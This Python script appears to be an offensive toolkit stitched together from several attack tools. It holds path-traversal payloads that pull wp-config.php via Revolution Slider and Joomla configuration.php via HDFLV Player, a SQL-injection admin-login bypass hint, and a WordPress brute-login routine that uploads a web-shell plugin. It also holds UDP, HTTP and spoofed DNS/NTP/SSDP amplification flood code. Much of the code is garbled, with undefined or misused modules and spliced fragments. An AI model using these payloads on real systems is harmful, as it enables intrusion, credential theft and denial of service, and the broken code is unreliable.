#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
from multiprocessing.dummy import Pool as ThreadPool

import requests
import targetss
import os
import random
import time

# !/usr/bin/python
# -*-coding:Latin-1 -*

from colorama import *
from colorama import Fore
from future.moves import sys
import elowor


# HELP : 3 Exploit Bypass - revslider- hdflvp
# admin panel = BYpass use noredirect / or  user : 'or''='  pass: 'or''='   / or use  user : admin pass: admin ^^
# noinspection PyArgumentList

def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(4. / 100)


init()

la7mar = '\033[91m'
lazra9 = '\033[94m'
la5dhar = '\033[92m'
movv = '\033[95m'
lasfar = '\033[93m'
ramadhostsk = '\033[90m'
blid = '\033[1m'
star = '\033[4m'
bigas = '\033[07m'
bigbbs = '\033[27m'
hell = '\033[05m'
saker = '\033[25m'
labyadh = '\033[00m'
cyan = '\033[0;96m'
r = Fore.RED
g = Fore.GREEN
w = Fore.WHITE
b = Fore.BLUE
y = Fore.YELLOW
m = Fore.MAGENTA


def cls():
    linux = 'clear'
    windows = 'cls'


def print_logo():
    clear = '\x1b[0m'
    colors = [
        36,
        32,
        34,
        35,
        31,
        37,
    ]


def show_help(name_scp):
    print('''
Usage: %s [options]
''' % name_scp)
    print('Options:')
    print(' -i, --ip         Host ip to attack')
    print(' -b, --bytes      Number of bytes to send in attack')
    print(' -t, --threads    Number of threads\n')
    print('Example: %s -i 192.168.0.100 -b 2048 -t 25' % name_scp)
    _exit(0)


def udp(ip, nbytes):
    while 1:
        s = socket(AF_INET, SOCK_DGRAM)
        port = random.randint(80, 8080)
        bytes_ = random._urandom(nbytes)
        stdout.write('\rSending %i bytes to %s:%i' % (len(bytes_), ip,
                                                      port))
        s.sendto(bytes_, (ip, port))
        s.close()


print_logo()

# ------------------------------------------------------------------------

of = '/admin/login.php'

# ----------------------------------------------------------------------------

jsk = \
    '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php'

# ----------------------------------------------------------------------------------

hdf = \
    '/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php'

# ------------------------------------------------------------------------------------------

try:
    q = input('Enter Scanned target list with port: ')
    ww = open  # type: object
except:
    print('Pffffff your files not found  -_-')

# noinspection PyTypeChecker

for hostsk in q:
    try:

        # ############### BYPASS ##########################

        conn = httplib.HTTPConnection(hostsk)
        conn.request('POST', of)
        conn = conn.getresponse()
        html = conn.read()

        # ########### Config WP ###########################

        connwp = httplib.HTTPConnection(hostsk)
        connwp.request('POST', jsk)
        connwp = connwp.getresponse()
        htmlwp = connwp.read()

        # ########### Com HDFVLP ##########################

        connjm = httplib.HTTPConnection(hostsk)
        connjm.request('POST', hdf)
        connjm = connjm.getresponse()
        htmljm = connjm.read()

        # #################################################################################

        if conn.status == 200:
            print('Faund ==========> ', hostsk + of)
            with open('Panel Admin Bypass.txt', 'a') as res:
                res.writelines(hostsk + of + '\n')
        elif connwp.status == 200 and ('DB_USER' and 'DB_PASSWORD'
                                       and 'DB_HOST') in htmlwp:

            # ----------------------------------------------------------------------------------

            print('Config WP Faund ==========> ', hostsk + hdf)
        with open('joomla_config.txt', 'a') as jm1:
            jm1.writelines(hostsk + hdf + '\n')
    finally:
        pass


def prYellow():
    pass


def prGreen(param):
    pass


# noinspection PyTypeChecker

def WploginShell(url):
    Headers = \
        {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}

    lib = requests.session()
    try:

        # # Words Regex

        First = re.findall('http://(.*?)/wp-login.php', url)
        site = urllib.urlopen(targetss)
        GetRegex = lib.get(site + '/wp-login.php')

        # Regex Words of login

        Regex = \
            re.findall('"button button-primary button-large" value="(.*?)"'
                       , GetRegex.content)

        # User and Pass get it from File

        User = re.findall('@(.*?)#', url)
        Passwd = re.findall('&(.*?)@', url)

        # Post Data login

        Pax = {
            'log': User[0],
            'pwd': Passwd[0],
            'wp-submit': Regex[0],
            'redirect_to': site + '/wp-admin/',
            'testcookie': '1',
        }

        req = lib.post(site + '/wp-login.php', data=Pax,
                       headers=Headers, timeout=20)
        if '<li id="wp-admin-bar-logout">' in req.content:
            save = open('logins.txt', 'a')
            save.write('[+]Login Success ' + '\n' + '[#]Target:' + site
                       + '\n' + '[#]UserName:' + User[0] + '\n'
                       + '[#]Password:' + Passwd[0])
            save.close()
            prYellow()

            # Path for get Data

            reqs = lib.get(site
                           + '/wp-admin/plugin-install.php?tab=upload')

            Regex1 = \
                re.findall('id="_wpnonce" name="_wpnonce" value="(.*?)"'
                           , reqs.content)

            Regex2 = \
                re.findall('id="install-plugin-submit" class="button" value="(.*?)"'
                           , reqs.content)

            # Shell Uploads

            FileUpload = 'up.zip'
            b0x = {'_wpnonce': Regex1[0], '_wp_http_referer': site \
                                                              + '/wp-admin/plugin-install.php?tab=upload',
                   'install-plugin-submit': Regex2[0]}

            b0x2 = {'pluginzip': (FileUpload, open(FileUpload, 'rb'),
                                  'multipart/form-data')}

            login = lib.post(site
                             + '/wp-admin/update.php?action=upload-plugin'
                             , data=b0x, files=b0x2, headers=Headers)

            uploads = lib.post(site
                               + '/wp-admin/update.php?action=upload-plugin'
                               , files=b0x2, headers=Headers)

            exploit = requests.get(site
                                   + '/wp-content/plugins/upspy/up.php'
                                   , timeout=20)
            if 'Filename:' in exploit.content:
                prGreen('[+] Uploaded Success --> ' + site
                        + '/wp-content/plugins/upspy/up.php')
                open('Shells.txt', 'a').write(site
                                              + '/wp-content/plugins/upspy/up.php' + '\n')
            else:
                print('[-]Fail Uploaded -- > ' + site)
        else:
            print('[-] Login  Fail ' + site)
    except:

        print('[-]Not Wordpress Panel -- > ')


class Files(object):

    @classmethod
    def readlines(cls):
        pass


# noinspection PyTypeChecker

def start():
    for i in Files.readlines():
        try:
            i = i.strip()
            WploginShell(i)
        except:

            pass


pool = ThreadPool(250)
pool.close()
pool.join()


class Index(object):

    def __init__(
            self,
            target,
            threads,
            domains,
            event,
    ):
        """

        :rtype: object
        """

        self.event = event
        self.target = target
        self.threads = threads
        self.passwords = passwords.get
        self.domains = domains

    def stress(self):
        for i in range(self.threads):  # type: int
            t = threading.Thread(target=self.__attack)
            t.start()

    def __send(
            self,
            sock,
            soldier,
            proto,
            payload,
    ):
        """
            Send a Spoofed Packet
        """

        udp = UDP().pack(self.target, soldier)
        ip = telnetlib.IP(self.target, soldier, udp,
                          proto=ftplib.socket.IPPROTO_UDP).pack()
        sock.sendto(ip + udp + payload, (soldier, PORT[proto]))

    def GetAmpSize(
            self,
            proto,
            soldier,
            domain='',
            PAYLOAD='',
    ):
        '''
            Get Amplification Size
        '''

        sock = ftplib.socket.socket(ftplib.socket.AF_INET,
                                    ftplib.socket.SOCK_DGRAM)
        sock.settimeout(2)
        data = ''
        if proto in ['ntp', 'ssdp']:
            packet = PAYLOAD[proto]
            sock.sendto(packet, (soldier, PORT[proto]))
            try:
                while True:
                    data += sock.recvfrom(65535)[0]
            except ftplib.socket.timeout:
                sock.close()
                return (len(data), len(packet))
        if proto == 'dns':
            packet = self.__GetDnsQuery(domain)
        else:
            packet = PAYLOAD[proto]
        try:
            sock.sendto(packet, (soldier, PORT[proto]))
            (data, _) = sock.recvfrom(65535)
        except ftplib.socket.timeout:
            data = ''
        finally:
            sock.close()
        return (len(data), len(packet))

    def __GetQName(self, domain):
        '''
            QNAME A domain name represented as a sequence of labels
            where each label consists of a length
            octet followed by that number of octets
        '''

        labels = domain.split('.')
        QName = ''
        for label in labels:
            if len(label):
                QName += struct.pack('B', len(label)) + label
        return QName

    def __GetDnsQuery(self, domain, PAYLOAD=''):
        global ID
        ID = struct.pack('H', ID)  # type: str
        QName = self.__GetQName(domain)
        return PAYLOAD[domains].format(ID, QName)

    def __attack(
            self,
            FILE_HANDLE='',
            amplification='',
            PAYLOAD='',
    ):
        global npackets
        global nbytes
        _files = files
        for proto in _files:  # Open Amplification files
            f = open(_files[proto][FILE_NAME], 'r')
            _files[proto].append(f)  # _files = {'proto':['file_name', file_handle]}
        sock = ftplib.socket.socket(ftplib.socket.AF_INET,
                                    ftplib.socket.SOCK_RAW,
                                    ftplib.socket.IPPROTO_RAW)
        i = 0
        while self.event.isSet():
            for proto in _files:
                soldier = _files[proto][FILE_HANDLE].readline().strip()
                if soldier:
                    if proto == 'dns':
                        if not amplification[proto].has_key(soldier):
                            amplification[proto][soldier] = {}
                        for domain in self.domains:
                            if not amplification[proto][soldier].has_key(domain):
                                (size, _) = self.GetAmpSize(proto,
                                                            soldier, domain)
                                if size == 0:
                                    break
                                elif size < len(PAYLOAD[proto]):
                                    continue
                                else:
                                    amplification[proto][soldier][domain] = \
                                        size
                            amp = self.__GetDnsQuery(domain)
                            self.__send(sock, soldier, proto, amp)
                            npackets += 1
                            i += 1
                            nbytes += \
                                amplification[proto][soldier][domain]
                    else:
                        if not amplification[proto].has_key(soldier):
                            (size, _) = self.GetAmpSize(proto, soldier)
                            if size < len(PAYLOAD[proto]):
                                continue
                            else:
                                amplification[proto][soldier] = size
                        amp = PAYLOAD[proto]
                        npackets += 1
                        i += 1
                        nbytes += amplification[proto][soldier]
                        self.__send(sock, soldier, proto, amp)
                else:
                    _files[proto][FILE_HANDLE].seek(0)
        sock.close()
        for proto in _files:
            _files[proto][FILE_HANDLE].close()

    pass


def part():
    global targetss, tlds
    for i in targetss:  # type: str
        tlds[i] = i
        start()

    global send_packet
    a = socket.recv((credentials.user, credentials.password))  # socket type tcp
    if int(packet) > 1024:
        sya.stdout.write(colored('[-]', 'red'))  # if socket bigger than 1024 show this message
        sya.stdout.write(colored(' This packet so big ...\n', 'white'))
        sya.exit()
    else:
        send_packet = pinject.md5(str(username.randint(1,
                                                       1000))).hexdigest() * int(packet)

    # send_packet = str(username.randint(1, 100)) * int(packet) # This may be less noisy

    try:
        q.connect((host, int(port)))  # connect to the host
        q.send('''GET /%s HTTP/1.1\r
\r
''' % send_packet)  # send packet to host
        r = q.recv(1024)
        q.send('''Host: %s:%s\r
\r
''' % (host, port))
        r = q.recv(1024)
        q.send('''Content-Lenght: %s\r
\r
''' % len(send_packet))
        sya.stdout.write(colored('\r[+]', 'green'))
        sya.stdout.write(colored(' Sending %s bytes to %s\r'
                                 % (len(send_packet), host), 'white'))  # show state of attack
        sya.stdout.flush()
        q.close()  # close the socket
    except socket.error as E:

        # socket can't connect here and show its state

        oa.system('cls')  # if windows

        # oa.system("clear") # if linux or mac

        default_banner()  # main banner
        sya.stdout.write(colored('\r[+]', 'green'))
        sya.stdout.write(colored(' Host %s maybe down !!!\n' % host,
                                 'white'))  # show state of socket
        sya.stdout.write(colored('\r[-]', 'red'))
        sya.stdout.write(colored(' Or firewall block the attack ...\n',
                                 'white'))
        sya.stdout.write(colored('''
[!] Erro code => %s
''' % E,
                                 'grey'))
        sya.stdout.flush()
        sya.exit()
